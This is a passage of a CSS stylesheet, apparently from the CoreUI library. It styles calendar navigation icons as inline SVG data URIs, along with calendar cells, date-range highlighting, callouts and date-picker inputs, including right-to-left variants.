                background-image: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCA1MTIgNTEyJyByb2xlPSdpbWcnPjxwb2x5Z29uIGZpbGw9JyM4YTkzYTInIHBvaW50cz0nOTUuMzE0IDQ0Ny4zMTMgNzIuNjg2IDQyNC42ODcgMjQ1LjM3MyAyNTIgNzIuNjg2IDc5LjMxMyA5NS4zMTQgNTYuNjg3IDI5MC42MjcgMjUyIDk1LjMxNCA0NDcuMzEzJz48L3BvbHlnb24+PHBvbHlnb24gZmlsbD0nIzhhOTNhMicgcG9pbnRzPScyNTUuMzE0IDQ0Ny4zMTMgMjMyLjY4NiA0MjQuNjg3IDQwNS4zNzMgMjUyIDIzMi42ODYgNzkuMzEzIDI1NS4zMTQgNTYuNjg3IDQ1MC42MjcgMjUyIDI1NS4zMTQgNDQ3LjMxMyc+PC9wb2x5Z29uPjwvc3ZnPg==);
            }
            *[dir="rtl"] .calendar-nav-icon-double-next {
                background-image: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCA1MTIgNTEyJyByb2xlPSdpbWcnPjxwb2x5Z29uIGZpbGw9JyM4YTkzYTInIHBvaW50cz0nNDE2LjY4NiA0NDcuMzEzIDIyMS4zNzMgMjUyIDQxNi42ODYgNTYuNjg3IDQzOS4zMTQgNzkuMzEzIDI2Ni42MjcgMjUyIDQzOS4zMTQgNDI0LjY4NyA0MTYuNjg2IDQ0Ny4zMTMnPjwvcG9seWdvbj48cG9seWdvbiBmaWxsPScjOGE5M2EyJyBwb2ludHM9JzI1Ni42ODYgNDQ3LjMxMyA2MS4zNzMgMjUyIDI1Ni42ODYgNTYuNjg3IDI3OS4zMTQgNzkuMzEzIDEwNi42MjcgMjUyIDI3OS4zMTQgNDI0LjY4NyAyNTYuNjg2IDQ0Ny4zMTMnPjwvcG9seWdvbj48L3N2Zz4=);
            }
            html:not([dir="rtl"]) .calendar-nav-icon-double-next:hover {
                background-image: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCA1MTIgNTEyJyByb2xlPSdpbWcnPjxwb2x5Z29uIGZpbGw9J3JnYmEoNDQsIDU2LCA3NCwgMC45NSknIHBvaW50cz0nOTUuMzE0IDQ0Ny4zMTMgNzIuNjg2IDQyNC42ODcgMjQ1LjM3MyAyNTIgNzIuNjg2IDc5LjMxMyA5NS4zMTQgNTYuNjg3IDI5MC42MjcgMjUyIDk1LjMxNCA0NDcuMzEzJz48L3BvbHlnb24+PHBvbHlnb24gZmlsbD0ncmdiYSg0NCwgNTYsIDc0LCAwLjk1KScgcG9pbnRzPScyNTUuMzE0IDQ0Ny4zMTMgMjMyLjY4NiA0MjQuNjg3IDQwNS4zNzMgMjUyIDIzMi42ODYgNzkuMzEzIDI1NS4zMTQgNTYuNjg3IDQ1MC42MjcgMjUyIDI1NS4zMTQgNDQ3LjMxMyc+PC9wb2x5Z29uPjwvc3ZnPg==);
            }
            *[dir="rtl"] .calendar-nav-icon-double-next:hover {
                background-image: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCA1MTIgNTEyJyByb2xlPSdpbWcnPjxwb2x5Z29uIGZpbGw9J3JnYmEoNDQsIDU2LCA3NCwgMC45NSknIHBvaW50cz0nNDE2LjY4NiA0NDcuMzEzIDIyMS4zNzMgMjUyIDQxNi42ODYgNTYuNjg3IDQzOS4zMTQgNzkuMzEzIDI2Ni42MjcgMjUyIDQzOS4zMTQgNDI0LjY4NyA0MTYuNjg2IDQ0Ny4zMTMnPjwvcG9seWdvbj48cG9seWdvbiBmaWxsPSdyZ2JhKDQ0LCA1NiwgNzQsIDAuOTUpJyBwb2ludHM9JzI1Ni42ODYgNDQ3LjMxMyA2MS4zNzMgMjUyIDI1Ni42ODYgNTYuNjg3IDI3OS4zMTQgNzkuMzEzIDEwNi42MjcgMjUyIDI3OS4zMTQgNDI0LjY4NyAyNTYuNjg2IDQ0Ny4zMTMnPjwvcG9seWdvbj48L3N2Zz4=);
            }
            html:not([dir="rtl"]) .calendar-nav-icon-double-prev {
                background-image: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCA1MTIgNTEyJyByb2xlPSdpbWcnPjxwb2x5Z29uIGZpbGw9JyM4YTkzYTInIHBvaW50cz0nNDE2LjY4NiA0NDcuMzEzIDIyMS4zNzMgMjUyIDQxNi42ODYgNTYuNjg3IDQzOS4zMTQgNzkuMzEzIDI2Ni42MjcgMjUyIDQzOS4zMTQgNDI0LjY4NyA0MTYuNjg2IDQ0Ny4zMTMnPjwvcG9seWdvbj48cG9seWdvbiBmaWxsPScjOGE5M2EyJyBwb2ludHM9JzI1Ni42ODYgNDQ3LjMxMyA2MS4zNzMgMjUyIDI1Ni42ODYgNTYuNjg3IDI3OS4zMTQgNzkuMzEzIDEwNi42MjcgMjUyIDI3OS4zMTQgNDI0LjY4NyAyNTYuNjg2IDQ0Ny4zMTMnPjwvcG9seWdvbj48L3N2Zz4=);
            }
            *[dir="rtl"] .calendar-nav-icon-double-prev {
                background-image: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCA1MTIgNTEyJyByb2xlPSdpbWcnPjxwb2x5Z29uIGZpbGw9JyM4YTkzYTInIHBvaW50cz0nOTUuMzE0IDQ0Ny4zMTMgNzIuNjg2IDQyNC42ODcgMjQ1LjM3MyAyNTIgNzIuNjg2IDc5LjMxMyA5NS4zMTQgNTYuNjg3IDI5MC42MjcgMjUyIDk1LjMxNCA0NDcuMzEzJz48L3BvbHlnb24+PHBvbHlnb24gZmlsbD0nIzhhOTNhMicgcG9pbnRzPScyNTUuMzE0IDQ0Ny4zMTMgMjMyLjY4NiA0MjQuNjg3IDQwNS4zNzMgMjUyIDIzMi42ODYgNzkuMzEzIDI1NS4zMTQgNTYuNjg3IDQ1MC42MjcgMjUyIDI1NS4zMTQgNDQ3LjMxMyc+PC9wb2x5Z29uPjwvc3ZnPg==);
            }
            html:not([dir="rtl"]) .calendar-nav-icon-double-prev:hover {
                background-image: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCA1MTIgNTEyJyByb2xlPSdpbWcnPjxwb2x5Z29uIGZpbGw9J3JnYmEoNDQsIDU2LCA3NCwgMC45NSknIHBvaW50cz0nNDE2LjY4NiA0NDcuMzEzIDIyMS4zNzMgMjUyIDQxNi42ODYgNTYuNjg3IDQzOS4zMTQgNzkuMzEzIDI2Ni42MjcgMjUyIDQzOS4zMTQgNDI0LjY4NyA0MTYuNjg2IDQ0Ny4zMTMnPjwvcG9seWdvbj48cG9seWdvbiBmaWxsPSdyZ2JhKDQ0LCA1NiwgNzQsIDAuOTUpJyBwb2ludHM9JzI1Ni42ODYgNDQ3LjMxMyA2MS4zNzMgMjUyIDI1Ni42ODYgNTYuNjg3IDI3OS4zMTQgNzkuMzEzIDEwNi42MjcgMjUyIDI3OS4zMTQgNDI0LjY4NyAyNTYuNjg2IDQ0Ny4zMTMnPjwvcG9seWdvbj48L3N2Zz4=);
            }
            *[dir="rtl"] .calendar-nav-icon-double-prev:hover {
                background-image: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCA1MTIgNTEyJyByb2xlPSdpbWcnPjxwb2x5Z29uIGZpbGw9J3JnYmEoNDQsIDU2LCA3NCwgMC45NSknIHBvaW50cz0nOTUuMzE0IDQ0Ny4zMTMgNzIuNjg2IDQyNC42ODcgMjQ1LjM3MyAyNTIgNzIuNjg2IDc5LjMxMyA5NS4zMTQgNTYuNjg3IDI5MC42MjcgMjUyIDk1LjMxNCA0NDcuMzEzJz48L3BvbHlnb24+PHBvbHlnb24gZmlsbD0ncmdiYSg0NCwgNTYsIDc0LCAwLjk1KScgcG9pbnRzPScyNTUuMzE0IDQ0Ny4zMTMgMjMyLjY4NiA0MjQuNjg3IDQwNS4zNzMgMjUyIDIzMi42ODYgNzkuMzEzIDI1NS4zMTQgNTYuNjg3IDQ1MC42MjcgMjUyIDI1NS4zMTQgNDQ3LjMxMyc+PC9wb2x5Z29uPjwvc3ZnPg==);
            }
            html:not([dir="rtl"]) .calendar-nav-icon-next {
                background-image: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCA1MTIgNTEyJyByb2xlPSdpbWcnPjxwb2x5Z29uIGZpbGw9JyM4YTkzYTInIHBvaW50cz0nMTc5LjMxMyA0NTEuMzEzIDE1Ni42ODcgNDI4LjY4NyAzMjkuMzcyIDI1NiAxNTYuNjg3IDgzLjMxMyAxNzkuMzEzIDYwLjY4NyAzNzQuNjI3IDI1NiAxNzkuMzEzIDQ1MS4zMTMnPjwvcG9seWdvbj48L3N2Zz4=);
            }
            *[dir="rtl"] .calendar-nav-icon-next {
                background-image: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCA1MTIgNTEyJyByb2xlPSdpbWcnPjxwb2x5Z29uIGZpbGw9JyM4YTkzYTInIHBvaW50cz0nMzI0LjY4NyA0NTEuMzEzIDEyOS4zNzMgMjU2IDMyNC42ODcgNjAuNjg3IDM0Ny4zMTMgODMuMzEzIDE3NC42MjggMjU2IDM0Ny4zMTMgNDI4LjY4NyAzMjQuNjg3IDQ1MS4zMTMnPjwvcG9seWdvbj48L3N2Zz4=);
            }
            html:not([dir="rtl"]) .calendar-nav-icon-next:hover {
                background-image: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCA1MTIgNTEyJyByb2xlPSdpbWcnPjxwb2x5Z29uIGZpbGw9J3JnYmEoNDQsIDU2LCA3NCwgMC45NSknIHBvaW50cz0nMTc5LjMxMyA0NTEuMzEzIDE1Ni42ODcgNDI4LjY4NyAzMjkuMzcyIDI1NiAxNTYuNjg3IDgzLjMxMyAxNzkuMzEzIDYwLjY4NyAzNzQuNjI3IDI1NiAxNzkuMzEzIDQ1MS4zMTMnPjwvcG9seWdvbj48L3N2Zz4=);
            }
            *[dir="rtl"] .calendar-nav-icon-next:hover {
                background-image: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCA1MTIgNTEyJyByb2xlPSdpbWcnPjxwb2x5Z29uIGZpbGw9J3JnYmEoNDQsIDU2LCA3NCwgMC45NSknIHBvaW50cz0nMzI0LjY4NyA0NTEuMzEzIDEyOS4zNzMgMjU2IDMyNC42ODcgNjAuNjg3IDM0Ny4zMTMgODMuMzEzIDE3NC42MjggMjU2IDM0Ny4zMTMgNDI4LjY4NyAzMjQuNjg3IDQ1MS4zMTMnPjwvcG9seWdvbj48L3N2Zz4=);
            }
            html:not([dir="rtl"]) .calendar-nav-icon-prev {
                background-image: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCA1MTIgNTEyJyByb2xlPSdpbWcnPjxwb2x5Z29uIGZpbGw9JyM4YTkzYTInIHBvaW50cz0nMzI0LjY4NyA0NTEuMzEzIDEyOS4zNzMgMjU2IDMyNC42ODcgNjAuNjg3IDM0Ny4zMTMgODMuMzEzIDE3NC42MjggMjU2IDM0Ny4zMTMgNDI4LjY4NyAzMjQuNjg3IDQ1MS4zMTMnPjwvcG9seWdvbj48L3N2Zz4=);
            }
            *[dir="rtl"] .calendar-nav-icon-prev {
                background-image: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCA1MTIgNTEyJyByb2xlPSdpbWcnPjxwb2x5Z29uIGZpbGw9JyM4YTkzYTInIHBvaW50cz0nMTc5LjMxMyA0NTEuMzEzIDE1Ni42ODcgNDI4LjY4NyAzMjkuMzcyIDI1NiAxNTYuNjg3IDgzLjMxMyAxNzkuMzEzIDYwLjY4NyAzNzQuNjI3IDI1NiAxNzkuMzEzIDQ1MS4zMTMnPjwvcG9seWdvbj48L3N2Zz4=);
            }
            html:not([dir="rtl"]) .calendar-nav-icon-prev:hover {
                background-image: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCA1MTIgNTEyJyByb2xlPSdpbWcnPjxwb2x5Z29uIGZpbGw9J3JnYmEoNDQsIDU2LCA3NCwgMC45NSknIHBvaW50cz0nMzI0LjY4NyA0NTEuMzEzIDEyOS4zNzMgMjU2IDMyNC42ODcgNjAuNjg3IDM0Ny4zMTMgODMuMzEzIDE3NC42MjggMjU2IDM0Ny4zMTMgNDI4LjY4NyAzMjQuNjg3IDQ1MS4zMTMnPjwvcG9seWdvbj48L3N2Zz4=);
            }
            *[dir="rtl"] .calendar-nav-icon-prev:hover {
                background-image: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCA1MTIgNTEyJyByb2xlPSdpbWcnPjxwb2x5Z29uIGZpbGw9J3JnYmEoNDQsIDU2LCA3NCwgMC45NSknIHBvaW50cz0nMTc5LjMxMyA0NTEuMzEzIDE1Ni42ODcgNDI4LjY4NyAzMjkuMzcyIDI1NiAxNTYuNjg3IDgzLjMxMyAxNzkuMzEzIDYwLjY4NyAzNzQuNjI3IDI1NiAxNzkuMzEzIDQ1MS4zMTMnPjwvcG9seWdvbj48L3N2Zz4=);
            }
            .calendar-header-cell-inner {
                display: flex;
                align-items: center;
                justify-content: center;
                height: var(--cui-calendar-table-cell-size);
                font-weight: 600;
                color: var(--cui-calendar-cell-header-inner-color);
            }
            .calendar-cell {
                padding: 1px 0;
                text-align: center;
            }
            .calendar-cell:not(.disabled):not(.next):not(.previous):hover .calendar-cell-inner,
            .calendar-cell.clickable:hover .calendar-cell-inner {
                cursor: pointer;
                background-color: var(--cui-calendar-cell-hover-bg);
            }
            .calendar-cell.today .calendar-cell-inner {
                color: var(--cui-calendar-cell-today-color);
            }
            .calendar-cell.disabled,
            .calendar-cell.next,
            .calendar-cell.previous .calendar-cell-inner {
                color: var(--cui-calendar-cell-disabled-color);
            }
            .calendar-cell.disabled .calendar-cell-inner {
                cursor: not-allowed;
            }
            .calendar-cell.range:not(.selected) .calendar-cell-inner {
                background: var(--cui-calendar-cell-range-bg);
                border-radius: 0;
            }
            .calendar-cell.range:not(.selected):hover .calendar-cell-inner {
                position: relative;
            }
            .calendar-cell.range:not(.selected):hover .calendar-cell-inner::after {
                position: absolute;
                width: 100%;
                height: 100%;
                content: "";
                background: var(--cui-calendar-cell-range-hover-bg);
                border-radius: 0.375rem;
            }
            html:not([dir="rtl"]) .calendar-cell.range:not(.selected):first-child .calendar-cell-inner,
            html:not([dir="rtl"]) .calendar-cell:not(.range) + .range .calendar-cell-inner {
                border-top-left-radius: 0.375rem;
                border-bottom-left-radius: 0.375rem;
            }
            *[dir="rtl"] .calendar-cell.range:not(.selected):first-child .calendar-cell-inner,
            *[dir="rtl"] .calendar-cell:not(.range) + .range .calendar-cell-inner {
                border-top-right-radius: 0.375rem;
                border-bottom-right-radius: 0.375rem;
            }
            html:not([dir="rtl"]) .calendar-cell.range:not(.selected):last-child .calendar-cell-inner,
            html:not([dir="rtl"]) .calendar-cell.range:not(.selected).last .calendar-cell-inner {
                border-top-right-radius: 0.375rem;
                border-bottom-right-radius: 0.375rem;
            }
            *[dir="rtl"] .calendar-cell.range:not(.selected):last-child .calendar-cell-inner,
            *[dir="rtl"] .calendar-cell.range:not(.selected).last .calendar-cell-inner {
                border-top-left-radius: 0.375rem;
                border-bottom-left-radius: 0.375rem;
            }
            .calendar-cell.range-hover .calendar-cell-inner {
                position: relative;
            }
            .calendar-cell.range-hover .calendar-cell-inner::before {
                position: absolute;
                width: 100%;
                height: 100%;
                content: "";
            }
            .calendar-cell.range-hover .calendar-cell-inner::before,
            .calendar-cell.range-hover.selected .calendar-cell-inner::before {
                border-top: 1px dashed var(--cui-calendar-cell-selected-bg);
                border-bottom: 1px dashed var(--cui-calendar-cell-selected-bg);
                border-radius: 0;
            }
            .calendar-cell.range-hover:first-child .calendar-cell-inner::before,
            .calendar-cell:not(.range-hover) + .range-hover .calendar-cell-inner::before {
                border-left: 1px dashed var(--cui-calendar-cell-selected-bg);
            }
            html:not([dir="rtl"]) .calendar-cell.range-hover:first-child .calendar-cell-inner::before,
            html:not([dir="rtl"]) .calendar-cell:not(.range-hover) + .range-hover .calendar-cell-inner::before {
                border-top-left-radius: 0.375rem;
                border-bottom-left-radius: 0.375rem;
            }
            *[dir="rtl"] .calendar-cell.range-hover:first-child .calendar-cell-inner::before,
            *[dir="rtl"] .calendar-cell:not(.range-hover) + .range-hover .calendar-cell-inner::before {
                border-top-right-radius: 0.375rem;
                border-bottom-right-radius: 0.375rem;
            }
            .calendar-cell.range-hover:last-child .calendar-cell-inner::before,
            .calendar-cell.range-hover.last .calendar-cell-inner::before,
            .calendar-cell.range-hover + .range-hover:hover .calendar-cell-inner::before,
            .calendar-cell.range-hover:first-child:hover .calendar-cell-inner::before {
                border-right: 1px dashed var(--cui-calendar-cell-selected-bg);
            }
            html:not([dir="rtl"]) .calendar-cell.range-hover:last-child .calendar-cell-inner::before,
            html:not([dir="rtl"]) .calendar-cell.range-hover.last .calendar-cell-inner::before,
            html:not([dir="rtl"]) .calendar-cell.range-hover + .range-hover:hover .calendar-cell-inner::before,
            html:not([dir="rtl"]) .calendar-cell.range-hover:first-child:hover .calendar-cell-inner::before {
                border-top-right-radius: 0.375rem;
                border-bottom-right-radius: 0.375rem;
            }
            *[dir="rtl"] .calendar-cell.range-hover:last-child .calendar-cell-inner::before,
            *[dir="rtl"] .calendar-cell.range-hover.last .calendar-cell-inner::before,
            *[dir="rtl"] .calendar-cell.range-hover + .range-hover:hover .calendar-cell-inner::before,
            *[dir="rtl"] .calendar-cell.range-hover:first-child:hover .calendar-cell-inner::before {
                border-top-left-radius: 0.375rem;
                border-bottom-left-radius: 0.375rem;
            }
            .calendar-cell.range-hover.selected:hover .calendar-cell-inner::before {
                border: 0;
            }
            .calendar-cell.selected:not(.previous):not(.next) .calendar-cell-inner,
            .calendar-cell.selected:not(.previous):not(.next).start .calendar-cell-inner,
            .calendar-cell.selected:not(.previous):not(.next).end .calendar-cell-inner {
                position: relative;
                color: var(--cui-calendar-cell-selected-color);
                background: var(--cui-calendar-cell-selected-bg);
            }
            .calendar-cell.selected:not(.previous):not(.next).start .calendar-cell-inner::before,
            .calendar-cell.selected:not(.previous):not(.next).end .calendar-cell-inner::before {
                position: absolute;
                top: 0;
                right: 0;
                bottom: 0;
                left: 0;
                z-index: -1;
                content: "";
                background: var(--cui-calendar-cell-range-bg);
            }
            html:not([dir="rtl"]) .calendar-cell.selected:not(.previous):not(.next).start .calendar-cell-inner::before {
                border-top-left-radius: 0.375rem;
                border-bottom-left-radius: 0.375rem;
                border-top-right-radius: 0;
                border-bottom-right-radius: 0;
            }
            *[dir="rtl"] .calendar-cell.selected:not(.previous):not(.next).start .calendar-cell-inner::before {
                border-top-right-radius: 0.375rem;
                border-bottom-right-radius: 0.375rem;
                border-top-left-radius: 0;
                border-bottom-left-radius: 0;
            }
            html:not([dir="rtl"]) .calendar-cell.selected:not(.previous):not(.next).end .calendar-cell-inner::before {
                border-top-left-radius: 0;
                border-bottom-left-radius: 0;
                border-top-right-radius: 0.375rem;
                border-bottom-right-radius: 0.375rem;
            }
            *[dir="rtl"] .calendar-cell.selected:not(.previous):not(.next).end .calendar-cell-inner::before {
                border-top-right-radius: 0;
                border-bottom-right-radius: 0;
                border-top-left-radius: 0.375rem;
                border-bottom-left-radius: 0.375rem;
            }
            .calendar-cell-inner {
                display: flex;
                align-items: center;
                justify-content: center;
                height: var(--cui-calendar-table-cell-size);
                border-radius: 0.375rem;
            }
            .callout {
                --cui-callout-padding-x: 1rem;
                --cui-callout-padding-y: 1rem;
                --cui-callout-margin-x: 0;
                --cui-callout-margin-y: 1rem;
                --cui-callout-border-width: 1px;
                --cui-callout-border-color: #d8dbe0;
                --cui-callout-border-left-width: 4px;
                --cui-callout-border-radius: 0.375rem;
                padding: var(--cui-callout-padding-y) var(--cui-callout-padding-x);
                margin: var(--cui-callout-margin-y) var(--cui-callout-margin-x);
                border: var(--cui-callout-border-width) solid var(--cui-callout-border-color);
                border-radius: var(--cui-callout-border-radius);
            }
            html:not([dir="rtl"]) .callout {
                border-left-width: var(--cui-callout-border-left-width);
                border-left-color: var(--cui-callout-border-left-color);
            }
            *[dir="rtl"] .callout {
                border-right-width: var(--cui-callout-border-right-width);
                border-right-color: var(--cui-callout-border-right-color);
            }
            .callout-primary {
                --cui-callout-border-left-color: #321fdb;
            }
            .callout-secondary {
                --cui-callout-border-left-color: #9da5b1;
            }
            .callout-success {
                --cui-callout-border-left-color: #2eb85c;
            }
            .callout-danger {
                --cui-callout-border-left-color: #e55353;
            }
            .callout-warning {
                --cui-callout-border-left-color: #f9b115;
            }
            .callout-info {
                --cui-callout-border-left-color: #39f;
            }
            .callout-light {
                --cui-callout-border-left-color: #ebedef;
            }
            .callout-dark {
                --cui-callout-border-left-color: #4f5d73;
            }
            .picker {
                --cui-picker-footer-border-top: 1px solid #d8dbe0;
                --cui-picker-footer-padding: 0.5rem;
            }
            .picker .dropdown-menu {
                padding: 0;
            }
            .picker.show .input-group {
                color: var(--cui-input-focus-color, rgba(44, 56, 74, 0.95));
                background-color: var(--cui-input-focus-bg, #fff);
                border-color: var(--cui-input-focus-border-color, #998fed);
                outline: 0;
                box-shadow: 0 0 0 0.25rem rgba(50, 31, 219, 0.25);
            }
            .picker-input-group:hover .form-control:not(:-moz-placeholder-shown) ~ .input-group-text .picker-input-group-indicator:not(:last-child) {
                display: none;
            }
            .picker-input-group:hover .form-control:not(:placeholder-shown) ~ .input-group-text .picker-input-group-indicator:not(:last-child) {
                display: none;
            }
            .picker-input-group:hover .form-control:not(:-moz-placeholder-shown) ~ .input-group-text .picker-input-group-cleaner {
                display: initial;
            }
            .picker-input-group:hover .form-control:not(:placeholder-shown) ~ .input-group-text .picker-input-group-cleaner {
                display: initial;
            }
            .picker-input-group .form-control.hover {
                color: var(--cui-gray-500);
            }
            .picker-input-group .form-control:focus {
                border-color: var(--cui-input-border-color, #b1b7c1);
                outline: 0;
                box-shadow: none;
            }
            html:not([dir="rtl"]) .picker-input-group .form-control:not(:first-child) {
                border-left: 0;
            }
            *[dir="rtl"] .picker-input-group .form-control:not(:first-child) {
                border-right: 0;
            }
            html:not([dir="rtl"]) .picker-input-group .form-control:not(:last-child) {
                border-right: 0;
            }
            *[dir="rtl"] .picker-input-group .form-control:not(:last-child) {
                border-left: 0;
            }
            .picker-input-group .form-control[readonly] {
                background-color: var(--cui-input-bg, #fff);
            }
            .picker-input-group .form-control.form-control:disabled + .input-group-text {
                background-color: var(--cui-input-disabled-bg, #d8dbe0);
            }
            .picker-input-group.input-group {
                border-radius: 0.375rem;
            }
            .picker-input-group.input-group-lg {
                border-radius: 0.5rem;
            }
            .picker-input-group.input-group-lg .picker-input-group-icon {
                width: 1.25rem;
                height: 1.25rem;
                font-size: 1.25rem;
            }
            .picker-input-group.input-group-sm {
                border-radius: 0.25rem;
            }
            .picker-input-group.input-group-sm .picker-input-group-icon {
                width: 0.875rem;
                height: 0.875rem;
                font-size: 0.875rem;
            }
            .picker-input-group .input-group-text {
                color: var(--cui-gray-400);
                background-color: var(--cui-input-bg, #fff);
            }
            .picker-input-group-cleaner {
                display: none;
            }
            .picker-input-group-icon {
                display: block;
                width: 1rem;
                height: 1rem;
                font-size: 1rem;
                transition: background-image 0.15s ease-in-out;
            }
            @media (prefers-reduced-motion: reduce) {
                .picker-input-group-icon {
                    transition: none;
                }
            }
            .picker-footer {
                display: flex;
                justify-content: flex-end;
                padding: var(--cui-picker-footer-padding);
                border-top: var(--cui-picker-footer-border-top);
            }
            html:not([dir="rtl"]) .picker-footer .btn + .btn {
                margin-left: 0.5rem;
            }
            *[dir="rtl"] .picker-footer .btn + .btn {
                margin-right: 0.5rem;
            }
            .date-picker {
                --cui-date-picker-ranges-width: 10rem;
                --cui-date-picker-ranges-padding: 0.5rem;
                --cui-date-picker-ranges-border: 1px solid #d8dbe0;
                --cui-date-picker-timepicker-width: 20.25rem;
                --cui-date-picker-timepicker-border-top: 1px solid #d8dbe0;
            }
            .date-picker .dropdown-menu {
                width: -webkit-min-content;
                width: -moz-min-content;
                width: min-content;
            }
            .date-picker.is-invalid .form-control {
                --cui-input-border-color: #e55353;
            }
            .date-picker.is-invalid .input-group-text {
                --cui-input-group-addon-border-color: #e55353;
            }
            .date-picker.is-invalid .picker-input-group-indicator {
                --cui-input-group-addon-color: #e55353;
            }
            .date-picker.is-invalid .date-picker-input-icon {
                background-image: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCA1MTIgNTEyJyByb2xlPSdpbWcnPjxwYXRoIGZpbGw9JyNlNTUzNTMnIGQ9J000NzIsOTZIMzg0VjQwSDM1MlY5NkgxNjBWNDBIMTI4Vjk2SDQwYTI0LjAyOCwyNC4wMjgsMCwwLDAtMjQsMjRWNDU2YTI0LjAyOCwyNC4wMjgsMCwwLDAsMjQsMjRINDcyYTI0LjAyOCwyNC4wMjgsMCwwLDAsMjQtMjRWMTIwQTI0LjAyOCwyNC4wMjgsMCwwLDAsNDcyLDk2Wm0tOCwzNTJINDhWMTI4aDgwdjQwaDMyVjEyOEgzNTJ2NDBoMzJWMTI4aDgwWic+PC9wYXRoPjxyZWN0IHdpZHRoPSczMicgaGVpZ2h0PSczMicgeD0nMTEyJyB5PScyMjQnIGZpbGw9JyNlNTUzNTMnPjwvcmVjdD48cmVjdCB3aWR0aD0nMzInIGhlaWdodD0nMzInIHg9JzIwMCcgeT0nMjI0JyBmaWxsPScjZTU1MzUzJz48L3JlY3Q+PHJlY3Qgd2lkdGg9JzMyJyBoZWlnaHQ9JzMyJyB4PScyODAnIHk9JzIyNCcgZmlsbD0nI2U1NTM1Myc+PC9yZWN0PjxyZWN0IHdpZHRoPSczMicgaGVpZ2h0PSczMicgeD0nMzY4JyB5PScyMjQnIGZpbGw9JyNlNTUzNTMnPjwvcmVjdD48cmVjdCB3aWR0aD0nMzInIGhlaWdodD0nMzInIHg9JzExMicgeT0nMjk2JyBmaWxsPScjZTU1MzUzJz48L3JlY3Q+PHJlY3Qgd2lkdGg9JzMyJyBoZWlnaHQ9JzMyJyB4PScyMDAnIHk9JzI5NicgZmlsbD0nI2U1NTM1Myc+PC9yZWN0PjxyZWN0IHdpZHRoPSczMicgaGVpZ2h0PSczMicgeD0nMjgwJyB5PScyOTYnIGZpbGw9JyNlNTUzNTMnPjwvcmVjdD48cmVjdCB3aWR0aD0nMzInIGhlaWdodD0nMzInIHg9JzM2OCcgeT0nMjk2JyBmaWxsPScjZTU1MzUzJz48L3JlY3Q+PHJlY3Qgd2lkdGg9JzMyJyBoZWlnaHQ9JzMyJyB4PScxMTInIHk9JzM2OCcgZmlsbD0nI2U1NTM1Myc+PC9yZWN0PjxyZWN0IHdpZHRoPSczMicgaGVpZ2h0PSczMicgeD0nMjAwJyB5PSczNjgnIGZpbGw9JyNlNTUzNTMnPjwvcmVjdD48cmVjdCB3aWR0aD0nMzInIGhlaWdodD0nMzInIHg9JzI4MCcgeT0nMzY4JyBmaWxsPScjZTU1MzUzJz48L3JlY3Q+PHJlY3Qgd2lkdGg9JzMyJyBoZWlnaHQ9JzMyJyB4PSczNjgnIHk9JzM2OCcgZmlsbD0nI2U1NTM1Myc+PC9yZWN0Pjwvc3ZnPg==);
            }
            .date-picker.is-valid .form-control {
                --cui-input-border-color: #2eb85c;
            }
            .date-picker.is-valid .input-group-text {
                --cui-input-group-addon-border-color: #2eb85c;
            }
            .date-picker.is-valid .picker-input-group-indicator {
                --cui-input-group-addon-color: #2eb85c;
            }
            .date-picker.is-valid .date-picker-input-icon {
